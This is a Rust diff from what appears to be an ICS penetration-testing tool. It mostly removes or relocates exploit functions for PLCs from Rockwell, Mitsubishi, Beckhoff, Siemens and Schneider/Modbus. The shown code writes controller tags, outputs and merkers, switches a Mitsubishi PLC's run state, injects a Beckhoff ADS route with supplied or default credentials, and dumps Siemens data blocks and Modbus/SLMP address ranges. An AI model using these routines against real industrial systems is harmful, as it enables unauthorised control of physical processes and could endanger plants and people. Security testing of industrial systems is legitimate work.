-        } else if driver::is_struct_like(t.tag_type) && t.dimensions >= 1 {
-            let value = array1d_struct_map
-                .get(t.name.as_str())
-                .cloned()
-                .unwrap_or_else(|| format!("[{}D array]", t.dimensions));
-            out(&fmt_tag_row(
-                i64::from(t.instance_id),
-                &t.name,
-                &base,
-                dims,
-                &value,
-                i64::from(t.tag_type),
-            ));
-        } else {
-            let value = match t.dimensions {
-                1 => array1d_map
-                    .get(t.name.as_str())
-                    .cloned()
-                    .unwrap_or_else(|| "[array]".to_string()),
-                2.. => format!("[{}D array]", t.dimensions),
-                _ => value_map
-                    .get(t.name.as_str())
-                    .cloned()
-                    .unwrap_or_else(|| "-".to_string()),
-            };
-            out(&fmt_tag_row(
-                i64::from(t.instance_id),
-                &t.name,
-                &base,
-                dims,
-                &value,
-                i64::from(t.tag_type),
-            ));
-            if t.dimensions == 0 && driver::is_writable_type(t.tag_type) {
-                leaves_out.push((t.name.clone(), true));
+                let mut fields: HashMap<String, Value> = HashMap::new();
+                fields.insert(
+                    "protocols".into(),
+                    Value::Array(protocols.iter().map(|p| Value::String(p.clone())).collect()),
+                );
+                for d in all {
+                    let vf = serde_json::to_value(&d.fields).unwrap_or_default();
+                    fields.insert(d.vendor, vf);
+                }
+                let _ = tx.send(ScanEvent::DeviceFound(DeviceInfo {
+                    vendor: "multi".into(),
+                    ip: ip.to_string(),
+                    fields,
+                }));
             }
         }
     }
-    out(&sep);
-    out(&format!("[+] {} tag(s)", tags.len()));
-    save_tags_and_diff(ip, &tags, out);
-    leaves_out
 }
 
 fn save_tags_and_diff(
@@ -3223,10 +2602,6 @@ fn save_tags_and_diff(
     use casket::vendors::rockwell::driver;
     match Database::open(&Database::default_path()) {
         Ok(db) => {
-            // Normalize BOOL bit-position variants (low byte 0x00..0x1F = bit N of a word)
-            // to the standard BOOL code 0xC1 so that scan-to-scan encoding variations
-            // (PLC sometimes returns bit-offset form, sometimes the canonical form) don't
-            // produce spurious [~CHG] diffs.
             let data: Vec<(i64, &str, i64)> = tags
                 .iter()
                 .map(|t| {
@@ -3239,7 +2614,7 @@ fn save_tags_and_diff(
                     (i64::from(t.instance_id), t.name.as_str(), i64::from(norm))
                 })
                 .collect();
-            match db.upsert_tags(ip, &data) {
+            match db.upsert_tags_for_protocol(ip, "rockwell", &data) {
                 Ok(diff) if diff.is_empty() => {
                     out("[*] Tags saved: no changes since last scan");
                 }
@@ -3315,8 +2690,15 @@ fn exploit_rockwell_monitor(ip: &str, port: u16, out: &impl Fn(&str), stop: &Arc
 
         let ts = {
             use std::time::{SystemTime, UNIX_EPOCH};
-            let s = SystemTime::now().duration_since(UNIX_EPOCH).map_or(0, |d| d.as_secs());
-            format!("{:02}:{:02}:{:02} UTC", (s / 3600) % 24, (s / 60) % 60, s % 60)
+            let s = SystemTime::now()
+                .duration_since(UNIX_EPOCH)
+                .map_or(0, |d| d.as_secs());
+            format!(
+                "{:02}:{:02}:{:02} UTC",
+                (s / 3600) % 24,
+                (s / 60) % 60,
+                s % 60
+            )
         };
         out(&format!("[*] Poll #{poll} at {ts}"));
 
@@ -3326,135 +2708,6 @@ fn exploit_rockwell_monitor(ip: &str, port: u16, out: &impl Fn(&str), stop: &Arc
         }
     }
 }
-
-fn exploit_rockwell_read(ip: &str, port: u16, tag: &str, out: &impl Fn(&str)) {
-    use casket::vendors::rockwell::driver;
-    out(&format!("[*] Reading tag '{tag}' from {ip}..."));
-    match driver::read_tag(ip, port, tag) {
-        Ok(raw) => out(&format!("  {tag} = 0x{}", hex_fmt(&raw))),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_rockwell_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::rockwell::driver;
-    let (tag_name, raw_val) = input.split_once('=').unwrap_or((input, "00"));
-    let hex_val = raw_val.trim().trim_start_matches("0x").trim_start_matches("0X");
-    let value_bytes: Vec<u8> = hex_val
-        .as_bytes()
-        .chunks(2)
-        .filter_map(|c| u8::from_str_radix(std::str::from_utf8(c).ok()?, 16).ok())
-        .collect();
-    if value_bytes.is_empty() {
-        out(&format!(
-            "[-] {tag_name}: \"{raw_val}\" could not be parsed — use hex digits, e.g. 01 or 0x01"
-        ));
-        return;
-    }
-    let type_code: u16 = if value_bytes.len() == 1 { 0x00C1 } else { 0x00C4 };
-    match driver::write_tag(ip, port, tag_name, type_code, &value_bytes) {
-        Ok(()) => out(&format!("[+] {tag_name}: written")),
-        Err(e) => out(&format!("[-] {tag_name}: {e}")),
-    }
-}
-
-fn exploit_mitsubishi_info(ip: &str, out: &impl Fn(&str)) {
-    use casket::vendors::mitsubishi::scan;
-    out(&format!("[*] Getting Mitsubishi device info from {ip}..."));
-    match scan::scan_ip(ip, 3, true) {
-        Ok(devs) => {
-            if devs.is_empty() {
-                out("[-] No Mitsubishi device responded");
-            }
-            for d in &devs {
-                out(&format!("  PLC Type: {}", d.plc_type));
-                if let Some(title) = &d.title {
-                    out(&format!("  Title:    {title}"));
-                }
-                if let Some(comment) = &d.comment {
-                    out(&format!("  Comment:  {comment}"));
-                }
-            }
-        }
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-fn exploit_mitsubishi_state(ip: &str, state: &str, out: &impl Fn(&str)) {
-    use casket::vendors::mitsubishi::control;
-    let iface = NetworkInterface {
-        name: "auto".into(),
-        ip: local_ip_for(ip),
-        netmask: "255.255.255.0".into(),
-    };
-    out(&format!("[*] Setting Mitsubishi to {state}..."));
-    match control::set_state_ip(&iface, ip, state) {
-        Ok(true) => out(&format!("[+] State set to {state}")),
-        Ok(false) => out("[!] Command sent: no confirmation"),
-        Err(e) => out(&format!("[-] {e}")),
-    }
-}
-
-// ─── Column headers ──────────────────────────────────────────────────────────
-
-fn io_header() -> [String; 2] {
-    [
-        format!(
-            "  {:<10}  {:<4}  {:<5}  {}",
-            "Address", "Bit", "Value", "Raw"
-        ),
-        format!("  {:─<10}  {:─<4}  {:─<5}  {:─<3}", "", "", "", ""),
-    ]
-}
-
-fn fmt_io_row(addr: &str, bit: &str, val: u8) -> String {
-    let value_str = if val != 0 { "true " } else { "false" };
-    format!("  {addr:<10}  {bit:<4}  {value_str:<5}  {val}")
-}
-
-fn modbus_header() -> [String; 2] {
-    [
-        format!(
-            "  {:<10}  {:<8}  {:<10}  {}",
-            "Address", "Number", "Value", "Hex"
-        ),
-        format!("  {:─<10}  {:─<8}  {:─<10}  {:─<6}", "", "", "", ""),
-    ]
-}
-
-fn fmt_modbus_row(r: &casket::vendors::schneider::modbus::ModbusRegister) -> String {
-    format!(
-        "  {:<10}  {:<8}  {:<10}  {:#06x}",
-        r.address, r.display_addr, r.raw, r.raw
-    )
-}
-
-fn slmp_header() -> [String; 2] {
-    [
-        format!("  {:<12}  {:<10}  {}", "Device", "Address", "Value"),
-        format!("  {:─<12}  {:─<10}  {:─<8}", "", "", ""),
-    ]
-}
-
-fn fmt_slmp_row(v: &casket::vendors::mitsubishi::slmp::SlmpValue) -> String {
-    format!("  {:<12}  {:<10}  {}", v.display, v.raw, v.value_str)
-}
-
-fn ads_symbol_header() -> [String; 2] {
-    [
-        format!(
-            "  {:<48}  {:<14}  {:<20}  {}",
-            "Name", "Type", "Value", "Size"
-        ),
-        format!("  {:─<48}  {:─<14}  {:─<20}  {:─<8}", "", "", "", ""),
-    ]
-}
-
-fn fmt_ads_symbol_row(name: &str, type_name: &str, value: &str, size: u32) -> String {
-    format!("  {name:<48}  {type_name:<14}  {value:<20}  {size} B")
-}
-
-// ─── DB save + diff helpers ──────────────────────────────────────────────────
 
 fn save_and_diff(
     ip: &str,
@@ -3491,62 +2744,6 @@ fn save_and_diff(
     }
 }
 
-// ─── New Beckhoff exploits ───────────────────────────────────────────────────
-
-fn exploit_beckhoff_get_state(ip: &str, port: u16, out: &impl Fn(&str)) {
-    use casket::vendors::beckhoff::{ads, scan};
-    let local_netid = ads::build_local_netid(&local_ip_for(ip));
-    out(&format!("[*] Reading TwinCAT runtime state from {ip}..."));
-    match scan::discover_ip_with_port(ip, 3, true, port)
-        .ok()
-        .and_then(|mut v| {
-            if v.is_empty() {
-                None
-            } else {
-                Some(v.remove(0))
-            }
-        }) {
-        Some(dev) => out(&format!(
-            "[+] State: {}",
-            scan::get_state(&dev, &local_netid, port)
-        )),
-        None => out("[-] No Beckhoff device responded"),
-    }
-}
-
-fn exploit_beckhoff_add_route(ip: &str, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::beckhoff::{ads, scan};
-    let local_ip = local_ip_for(ip);
-    let local_netid = ads::build_local_netid(&local_ip);
-    let (username, password) = input.split_once(':').unwrap_or((input, "1"));
-    out(&format!(
-        "[*] Injecting ADS route on {ip} for user '{username}'..."
-    ));
-    match scan::discover_ip(ip, 3, true).ok().and_then(|mut v| {
-        if v.is_empty() {
-            None
-        } else {
-            Some(v.remove(0))
-        }
-    }) {
-        Some(dev) => {
-            if scan::add_route(
-                &dev,
-                &local_ip,
-                &local_netid,
-                username,
-                password,
-                Some("scadaver"),
-            ) {
-                out("[+] Route added: this host now has ADS access to the PLC");
-            } else {
-                out("[-] Route injection failed (wrong credentials or device denied)");
-            }
-        }
-        None => out("[-] No Beckhoff device responded"),
-    }
-}
-
 fn exploit_beckhoff_symbols(
     ip: &str,
     port: u16,
@@ -3574,12 +2771,12 @@ fn exploit_beckhoff_symbols(
         out("[-] No symbols returned (device may not support ADS symbol upload)");
         return;
     }
-    let [hdr, sep] = ads_symbol_header();
+    let [hdr, sep] = crate::ops::ads_symbol_header();
     out(&hdr);
     out(&sep);
     for s in &symbols {
         let value = s.value_str.as_deref().unwrap_or("-");
-        out(&fmt_ads_symbol_row(&s.name, &s.type_name, value, s.size));
+        out(&crate::ops::fmt_ads_symbol_row(&s.name, &s.type_name, value, s.size));
     }
     out(&sep);
     out(&format!("[+] {} symbol(s)", symbols.len()));
@@ -3595,1585 +2792,13 @@ fn exploit_beckhoff_symbols(
         })
         .collect();
     save_and_diff(ip, "ads", &points, out);
-    let leaves: Vec<(String, bool)> = symbols
-        .iter()
-        .map(|s| (s.name.clone(), true))
-        .collect();
+    let leaves: Vec<(String, bool)> = symbols.iter().map(|s| (s.name.clone(), true)).collect();
     let _ = tx.send(ScanEvent::TagLeaves {
         ip: ip.to_string(),
         port,
         vendor: "beckhoff".to_string(),
         leaves,
     });
-}
-
-// ─── New Siemens exploits ────────────────────────────────────────────────────
-
-fn exploit_siemens_set_outputs(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::siemens::s7comm;
-    let port = if port == 0 { 102 } else { port };
-    let password = device_field_str(ip, "password");
-    let args = input.trim();
-    out(&format!("[*] Writing outputs '{args}' to {ip}:{port}..."));
-    if s7comm::set_outputs(ip, args, port, 5, password.as_deref()) {
-        out("[+] Outputs written");
-    } else if s7comm::probe_auth_required(ip, port, 5) {
-        out("[-] Access denied: store password in device fields[\"password\"] to authenticate");
-    } else {
-        out("[-] Write failed");
-    }
-}
-
-fn exploit_siemens_set_merkers(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::siemens::s7comm;
-    let port = if port == 0 { 102 } else { port };
-    let password = device_field_str(ip, "password");
-    let args = input.trim();
-    let (bits, offset_s) = args.split_once(':').unwrap_or((args, "0"));
-    let offset = offset_s.trim().parse::<u32>().unwrap_or(0);
-    out(&format!(
-        "[*] Writing merkers '{bits}' at offset {offset} to {ip}:{port}..."
-    ));
-    if s7comm::set_merkers(ip, bits, offset, port, 5, password.as_deref()) {
-        out("[+] Merkers written");
-    } else if s7comm::probe_auth_required(ip, port, 5) {
-        out("[-] Access denied: store password in device fields[\"password\"] to authenticate");
-    } else {
-        out("[-] Write failed");
-    }
-}
-
-fn exploit_siemens_list_dbs(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::siemens::s7comm;
-    let port = if port == 0 { 102 } else { port };
-    let db_password = device_field_str(ip, "password");
-    let password: Option<&str> =
-        if input.trim().is_empty() { db_password.as_deref() } else { Some(input.trim()) };
-    out(&format!(
-        "[*] Scanning DB1..200 on {ip}:{port} (may take a moment)..."
-    ));
-    let blocks = s7comm::list_data_blocks(ip, port, 5, password);
-    if blocks.is_empty() {
-        if s7comm::probe_auth_required(ip, port, 5) {
-            out("[-] Access denied: enter password in the exploit prompt or store in device fields[\"password\"]");
-        } else {
-            out("[-] No readable data blocks found");
-        }
-        return;
-    }
-    out(&format!("  {:<8}  {}", "Block", "Bytes read"));
-    out(&format!("  {:─<8}  {:─<10}", "", ""));
-    for (db_num, size) in &blocks {
-        out(&format!("  {:<8}  {size}", format!("DB{db_num}")));
-    }
-    out(&format!("[+] {} data block(s) found", blocks.len()));
-}
-
-fn exploit_siemens_read_db(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::siemens::s7comm;
-    let port = if port == 0 { 102 } else { port };
-    let password = device_field_str(ip, "password");
-    let parts: Vec<&str> = input.trim().splitn(3, ':').collect();
-    let db_str = parts.first().copied().unwrap_or("DB1");
-    let db_num = db_str
-        .trim_start_matches(|c: char| c.is_alphabetic())
-        .parse::<u16>()
-        .unwrap_or(1);
-    let offset = parts
-        .get(1)
-        .and_then(|s| s.parse::<u16>().ok())
-        .unwrap_or(0);
-    let length = parts
-        .get(2)
-        .and_then(|s| s.parse::<u16>().ok())
-        .unwrap_or(64)
-        .min(240);
-    out(&format!(
-        "[*] Reading DB{db_num} offset={offset} len={length} from {ip}:{port}..."
-    ));
-    match s7comm::read_data_block(ip, db_num, offset, length, port, 5, password.as_deref()) {
-        Ok(data) => {
-            for line in hex_dump_lines(&data, offset) {
-                out(&line);
-            }
-            out(&format!("[+] {} bytes", data.len()));
-        }
-        Err(e) => {
-            if s7comm::probe_auth_required(ip, port, 5) {
-                out("[-] Access denied: store password in device fields[\"password\"] to authenticate");
-            } else {
-                out(&format!("[-] {e}"));
-            }
-        }
-    }
-}
-
-fn hex_dump_lines(data: &[u8], base_offset: u16) -> Vec<String> {
-    data.chunks(16)
-        .enumerate()
-        .map(|(i, chunk)| {
-            let offset = base_offset as usize + i * 16;
-            let hex: String = {
-                use std::fmt::Write;
-                chunk.iter().fold(String::new(), |mut s, b| {
-                    let _ = write!(s, "{b:02x} ");
-                    s
-                })
-            };
-            let ascii: String = chunk
-                .iter()
-                .map(|&b| if b.is_ascii_graphic() { b as char } else { '.' })
-                .collect();
-            format!("  {offset:04x}  {hex:<48}  {ascii}")
-        })
-        .collect()
-}
-
-// ─── New Schneider/Modbus exploits ───────────────────────────────────────────
-
-const MODBUS_ADDRESS_SPACE: u32 = 65_536;
-const MODBUS_WORD_CHUNK: u16 = 125;
-const MODBUS_BIT_CHUNK: u16 = 2000;
-const MODBUS_MAP_VALUE_OUTPUT_CAP: usize = 64;
-const MODBUS_MAP_ERROR_OUTPUT_CAP: usize = 20;
-const SLMP_ADDRESS_SPACE: u32 = 16_777_216;
-const SLMP_WORD_CHUNK: u16 = 960;
-const SLMP_BIT_CHUNK: u16 = 3584;
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-enum ModbusTable {
-    Holding,
-    Input,
-    Coil,
-    Discrete,
-}
-
-impl ModbusTable {
-    fn parse(input: &str) -> Option<Self> {
-        match input.trim().to_ascii_lowercase().as_str() {
-            "hr" | "holding" | "holding-register" | "holding-registers" | "hreg" | "hregs"
-            | "register" | "registers" => Some(Self::Holding),
-            "ir" | "input" | "input-register" | "input-registers" | "ireg" | "iregs" => {
-                Some(Self::Input)
-            }
-            "co" | "coil" | "coils" => Some(Self::Coil),
-            "di" | "discrete" | "discrete-input" | "discrete-inputs" | "input-bit"
-            | "input-bits" => Some(Self::Discrete),
-            _ => None,
-        }
-    }
-
-    fn short_name(self) -> &'static str {
-        match self {
-            Self::Holding => "HR",
-            Self::Input => "IR",
-            Self::Coil => "CO",
-            Self::Discrete => "DI",
-        }
-    }
-
-    fn label(self) -> &'static str {
-        match self {
-            Self::Holding => "holding registers",
-            Self::Input => "input registers",
-            Self::Coil => "coils",
-            Self::Discrete => "discrete inputs",
-        }
-    }
-
-    fn point_type(self) -> &'static str {
-        match self {
-            Self::Holding | Self::Input => "UINT16",
-            Self::Coil | Self::Discrete => "BOOL",
-        }
-    }
-
-    fn chunk_limit(self) -> u16 {
-        match self {
-            Self::Holding | Self::Input => MODBUS_WORD_CHUNK,
-            Self::Coil | Self::Discrete => MODBUS_BIT_CHUNK,
-        }
-    }
-
-    fn display_addr(self, address: u32) -> u32 {
-        let offset = match self {
-            Self::Holding => 40001,
-            Self::Input => 30001,
-            Self::Coil => 1,
-            Self::Discrete => 10001,
-        };
-        address + offset
-    }
-
-    fn point_key(self, address: u32) -> String {
-        format!("{}{}", self.short_name(), self.display_addr(address))
-    }
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-struct ModbusMapRange {
-    table: ModbusTable,
-    start: u32,
-    count: u32,
-}
-
-impl ModbusMapRange {
-    fn new(table: ModbusTable, start: u32, count: u32) -> Self {
-        Self {
-            table,
-            start,
-            count,
-        }
-    }
-
-    fn display_start(self) -> u32 {
-        self.table.display_addr(self.start)
-    }
-
-    fn display_end(self) -> u32 {
-        self.table.display_addr(self.start + self.count - 1)
-    }
-}
-
-fn quick_modbus_ranges() -> Vec<ModbusMapRange> {
-    vec![
-        ModbusMapRange::new(ModbusTable::Holding, 0, 32),
-        ModbusMapRange::new(ModbusTable::Input, 0, 32),
-        ModbusMapRange::new(ModbusTable::Coil, 0, 64),
-        ModbusMapRange::new(ModbusTable::Discrete, 0, 64),
-    ]
-}
-
-fn common_modbus_ranges() -> Vec<ModbusMapRange> {
-    vec![
-        ModbusMapRange::new(ModbusTable::Holding, 0, 1000),
-        ModbusMapRange::new(ModbusTable::Input, 0, 1000),
-        ModbusMapRange::new(ModbusTable::Coil, 0, 2000),
-        ModbusMapRange::new(ModbusTable::Discrete, 0, 2000),
-    ]
-}
-
-fn all_modbus_ranges() -> Vec<ModbusMapRange> {
-    vec![
-        ModbusMapRange::new(ModbusTable::Holding, 0, MODBUS_ADDRESS_SPACE),
-        ModbusMapRange::new(ModbusTable::Input, 0, MODBUS_ADDRESS_SPACE),
-        ModbusMapRange::new(ModbusTable::Coil, 0, MODBUS_ADDRESS_SPACE),
-        ModbusMapRange::new(ModbusTable::Discrete, 0, MODBUS_ADDRESS_SPACE),
-    ]
-}
-
-fn parse_modbus_map_input(input: &str) -> std::result::Result<Vec<ModbusMapRange>, String> {
-    let spec = input.trim();
-    if spec.is_empty() || spec.eq_ignore_ascii_case("quick") {
-        return Ok(quick_modbus_ranges());
-    }
-    if spec.eq_ignore_ascii_case("common") {
-        return Ok(common_modbus_ranges());
-    }
-    if spec.eq_ignore_ascii_case("all") {
-        return Ok(all_modbus_ranges());
-    }
-
-    let mut ranges = Vec::new();
-    for token in spec.split(',') {
-        let token = token.trim();
-        if token.is_empty() {
-            return Err(format_modbus_map_usage());
-        }
-        let parts: Vec<_> = token.split(':').map(str::trim).collect();
-        if parts.len() != 3 {
-            return Err(format_modbus_map_usage());
-        }
-        let table = ModbusTable::parse(parts[0]).ok_or_else(|| {
-            format!(
-                "unknown Modbus table '{}'. {}",
-                parts[0],
-                format_modbus_map_usage()
-            )
-        })?;
-        let start = parts[1].parse::<u32>().map_err(|_| {
-            format!(
-                "invalid start address '{}'. {}",
-                parts[1],
-                format_modbus_map_usage()
-            )
-        })?;
-        let count = parts[2].parse::<u32>().map_err(|_| {
-            format!(
-                "invalid count '{}'. {}",
-                parts[2],
-                format_modbus_map_usage()
-            )
-        })?;
-        if start >= MODBUS_ADDRESS_SPACE {
-            return Err(format!(
-                "start address {start} is outside 0..65535. {}",
-                format_modbus_map_usage()
-            ));
-        }
-        if count == 0 || count > MODBUS_ADDRESS_SPACE - start {
-            return Err(format!(
-                "count {count} at start {start} is outside the Modbus address space. {}",
-                format_modbus_map_usage()
-            ));
-        }
-        ranges.push(ModbusMapRange::new(table, start, count));
-    }
-
-    if ranges.is_empty() {
-        Err(format_modbus_map_usage())
-    } else {
-        Ok(ranges)
-    }
-}
-
-fn format_modbus_map_usage() -> String {
-    "use quick, common, all, or table:start:count entries like hr:0:500,ir:0:100,co:0:128,di:0:128"
-        .to_string()
-}
-
-fn modbus_map_chunks(range: ModbusMapRange) -> Vec<(u16, u16)> {
-    let mut chunks = Vec::new();
-    let mut start = range.start;
-    let mut remaining = range.count;
-    let max_count = u32::from(range.table.chunk_limit());
-    while remaining > 0 {
-        let count = remaining.min(max_count);
-        chunks.push((u16::try_from(start).unwrap_or(u16::MAX), u16::try_from(count).unwrap_or(u16::MAX)));
-        start += count;
-        remaining -= count;
-    }
-    chunks
-}
-
-fn exploit_modbus_map(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
-    use casket::vendors::schneider::modbus;
-
-    let ranges = match parse_modbus_map_input(input) {
-        Ok(ranges) => ranges,
-        Err(e) => {
-            out(&format!("[-] {e}"));
-            return;
-        }
-    };
-    let mode = input.trim();
-    let mode = if mode.is_empty() { "quick" } else { mode };
-    out(&format!(
-        "[*] Modbus map on {ip}:{} ({mode}, read-only)...",
-        casket::core::modbus::effective_port(port)
-    ));
-    out("[*] Modbus exposes address tables, not semantic tag names; this maps readable ranges.");
-    let mut points_addr = Vec::<String>::new();
-    let mut points_type = Vec::<String>::new();
-    let mut points_value = Vec::<String>::new();
-    let mut readable_chunks = 0usize;
-    let mut readable_values = 0usize;
-    let mut failed_chunks = 0usize;
-    let mut hidden_errors = 0usize;
-    let mut skipped_chunks = 0usize;
-    let mut interesting_total = 0usize;
-    let mut interesting_printed = 0usize;
-    let mut interesting_header_printed = false;
-
-    for range in ranges {
-        let chunks = modbus_map_chunks(range);
-        out(&format!(
-            "[*] {} {} {}..{} ({} value(s), {} chunk(s))",
-            range.table.short_name(),
-            range.table.label(),
-            range.display_start(),
-            range.display_end(),
-            range.count,
-            chunks.len()
-        ));
-        let mut consecutive_address_errors = 0usize;
-        for (idx, (start, count)) in chunks.iter().copied().enumerate() {
-            let result = match range.table {
-                ModbusTable::Holding => modbus::read_holding_registers(ip, port, start, count),
-                ModbusTable::Input => modbus::read_input_registers(ip, port, start, count),
-                ModbusTable::Coil => modbus::read_coils(ip, port, start, count),
-                ModbusTable::Discrete => modbus::read_discrete_inputs(ip, port, start, count),
-            };
-            match result {
-                Ok(regs) => {
-                    readable_chunks += 1;
-                    readable_values += regs.len();
-                    interesting_total += emit_modbus_interesting_limited(
-                        &regs,
-                        out,
-                        &mut interesting_printed,
-                        &mut interesting_header_printed,
-                    );
-                    collect_modbus_points(
-                        range.table,
-                        range.table.point_type(),
-                        &regs,
-                        &mut points_addr,
-                        &mut points_type,
-                        &mut points_value,
-                    );
-                    consecutive_address_errors = 0;
-                }
-                Err(e) => {
-                    failed_chunks += 1;
-                    if failed_chunks <= MODBUS_MAP_ERROR_OUTPUT_CAP {
-                        let display_start = range.table.display_addr(u32::from(start));
-                        let display_end = range
-                            .table
-                            .display_addr(u32::from(start) + u32::from(count) - 1);
-                        out(&format!(
-                            "[-] {} {}..{}: {e}",
-                            range.table.short_name(),
-                            display_start,
-                            display_end
-                        ));
-                    } else {
-                        hidden_errors += 1;
-                    }
-                    let error = e.to_string().to_ascii_lowercase();
-                    let remaining_chunks = chunks.len().saturating_sub(idx + 1);
-                    if error.contains("illegal function") {
-                        skipped_chunks += remaining_chunks;
-                        if remaining_chunks > 0 {
-                            out(&format!(
-                                "[!] {} table does not support this function; skipped {remaining_chunks} remaining chunk(s)",
-                                range.table.short_name()
-                            ));
-                        }
-                        break;
-                    }
-                    if error.contains("illegal data address") || error.contains("illegal address") {
-                        consecutive_address_errors += 1;
-                        if consecutive_address_errors >= 3 && remaining_chunks > 0 {
-                            skipped_chunks += remaining_chunks;
-                            out(&format!(
-                                "[!] {} table returned repeated illegal address errors; skipped {remaining_chunks} remaining chunk(s)",
-                                range.table.short_name()
-                            ));
-                            break;
-                        }
-                    } else {
-                        consecutive_address_errors = 0;
-                    }
-                }
-            }
-        }
-    }
-
-    if hidden_errors > 0 {
-        out(&format!(
-            "[!] {hidden_errors} more unreadable chunk(s) omitted from output"
-        ));
-    }
-    if skipped_chunks > 0 {
-        out(&format!(
-            "[!] {skipped_chunks} chunk(s) skipped after table-level Modbus exceptions"
-        ));
-    }
-    if interesting_total > MODBUS_MAP_VALUE_OUTPUT_CAP {
-        out(&format!(
-            "[*] {} more non-default value(s) omitted from output",
-            interesting_total - MODBUS_MAP_VALUE_OUTPUT_CAP
-        ));
-    }
-
-    let points: Vec<(&str, Option<&str>, &str)> = points_addr
-        .iter()
-        .zip(points_type.iter())
-        .zip(points_value.iter())
-        .map(|((addr, typ), value)| (addr.as_str(), Some(typ.as_str()), value.as_str()))
-        .collect();
-    if !points.is_empty() {
-        save_and_diff(ip, "modbus", &points, out);
-    }
-
-    if readable_values == 0 {
-        out("[!] No requested Modbus ranges were readable");
-    } else if interesting_total == 0 {
-        out(&format!(
-            "[+] {readable_values} value(s) read across {readable_chunks} chunk(s); all values were zero/OFF"
-        ));
-    } else {
-        out(&format!(
-            "[+] {readable_values} value(s) read across {readable_chunks} chunk(s); {interesting_total} non-default value(s) surfaced"
-        ));
-    }
-    if failed_chunks > 0 {
-        out(&format!("[!] {failed_chunks} chunk(s) were unreadable"));
-    }
-}
-
-fn emit_modbus_interesting_limited(
-    regs: &[casket::core::modbus::ModbusRegister],
-    out: &impl Fn(&str),
-    printed: &mut usize,
-    header_printed: &mut bool,
-) -> usize {
-    let mut total = 0usize;
-    for r in regs.iter().filter(|r| r.raw != 0) {
-        total += 1;
-        if *printed < MODBUS_MAP_VALUE_OUTPUT_CAP {
-            if !*header_printed {
-                let [hdr, sep] = modbus_header();
-                out(&hdr);
-                out(&sep);
-                *header_printed = true;
-            }
-            out(&fmt_modbus_row(r));
-            *printed += 1;
-        }
-    }
-    total
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-enum SlmpDeviceKind {
-    Word,
-    Bit,
-}
-
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-struct SlmpMapRange {
-    device: &'static str,
-    kind: SlmpDeviceKind,
-    start: u32,
-    count: u32,
-}
-
-impl SlmpMapRange {
-    fn new(device: &'static str, kind: SlmpDeviceKind, start: u32, count: u32) -> Self {
-        Self {
-            device,
-            kind,
-            start,
-            count,
-        }
-    }
-
-    fn display_start(self) -> String {
-        format!("{}{}", self.device, self.start)
-    }
-
-    fn display_end(self) -> String {
-        format!("{}{}", self.device, self.start + self.count - 1)
-    }
-
-    fn point_type(self) -> &'static str {
-        match self.kind {
-            SlmpDeviceKind::Word => "UINT16",
-            SlmpDeviceKind::Bit => "BOOL",
-        }
-    }
-
-    fn chunk_limit(self) -> u16 {
-        match self.kind {
-            SlmpDeviceKind::Word => SLMP_WORD_CHUNK,
-            SlmpDeviceKind::Bit => SLMP_BIT_CHUNK,
-        }
-    }
-}
-
-fn parse_slmp_device(input: &str) -> Option<(&'static str, SlmpDeviceKind)> {
-    match input.trim().to_ascii_lowercase().as_str() {
-        "d" | "data" | "data-register" | "data-registers" => Some(("D", SlmpDeviceKind::Word)),
-        "w" | "link-register" | "link-registers" => Some(("W", SlmpDeviceKind::Word)),
-        "r" | "file-register" | "file-registers" => Some(("R", SlmpDeviceKind::Word)),
-        "m" | "marker" | "markers" | "internal-relay" | "internal-relays" => {
-            Some(("M", SlmpDeviceKind::Bit))
-        }
-        "x" | "input" | "inputs" => Some(("X", SlmpDeviceKind::Bit)),
-        "y" | "output" | "outputs" => Some(("Y", SlmpDeviceKind::Bit)),
-        "b" | "link-relay" | "link-relays" => Some(("B", SlmpDeviceKind::Bit)),
-        _ => None,
-    }
-}
-
-fn quick_slmp_ranges() -> Vec<SlmpMapRange> {
-    vec![
-        SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 50),
-        SlmpMapRange::new("M", SlmpDeviceKind::Bit, 0, 128),
-    ]
-}
-
-fn common_slmp_ranges() -> Vec<SlmpMapRange> {
-    vec![
-        SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, 1000),
-        SlmpMapRange::new("W", SlmpDeviceKind::Word, 0, 512),
-        SlmpMapRange::new("R", SlmpDeviceKind::Word, 0, 512),
-        SlmpMapRange::new("M", SlmpDeviceKind::Bit, 0, 2048),
-        SlmpMapRange::new("X", SlmpDeviceKind::Bit, 0, 512),
-        SlmpMapRange::new("Y", SlmpDeviceKind::Bit, 0, 512),
-        SlmpMapRange::new("B", SlmpDeviceKind::Bit, 0, 512),
-    ]
-}
-
-fn all_slmp_ranges() -> Vec<SlmpMapRange> {
-    vec![
-        SlmpMapRange::new("D", SlmpDeviceKind::Word, 0, SLMP_ADDRESS_SPACE),
-        SlmpMapRange::new("W", SlmpDeviceKind::Word, 0, SLMP_ADDRESS_SPACE),
-        SlmpMapRange::new("R", SlmpDeviceKind::Word, 0, SLMP_ADDRESS_SPACE),
-        SlmpMapRange::new("M", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE),
-        SlmpMapRange::new("X", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE),
-        SlmpMapRange::new("Y", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE),
-        SlmpMapRange::new("B", SlmpDeviceKind::Bit, 0, SLMP_ADDRESS_SPACE),
-    ]
-}
-
-fn parse_slmp_map_input(input: &str) -> std::result::Result<Vec<SlmpMapRange>, String> {
-    let spec = input.trim();
-    if spec.is_empty() || spec.eq_ignore_ascii_case("quick") {
-        return Ok(quick_slmp_ranges());
-    }
-    if spec.eq_ignore_ascii_case("common") {
-        return Ok(common_slmp_ranges());
-    }
-    if spec.eq_ignore_ascii_case("all") {
